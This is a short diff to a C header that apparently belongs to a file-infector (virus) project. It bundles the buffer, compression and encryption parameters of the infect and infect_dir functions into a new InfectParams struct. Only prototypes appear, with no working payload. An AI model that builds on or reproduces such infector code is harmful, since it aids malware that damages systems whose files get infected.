@@ -26,7 +26,16 @@ typedef struct s_opt {
 	char print_msg;
 } Opt;
 
-int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt);
-int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt);
+typedef struct s_infect_params {
+	char *b;
+	size_t bn;
+	size_t cmpr_off;
+	size_t cmpr_len;
+	size_t crypt_off;
+	size_t crypt_len;
+} InfectParams;
+
+int infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt);
+int infect(char *fname, char *outname, struct s_infect_params p, struct s_opt opt);
 
 #endif
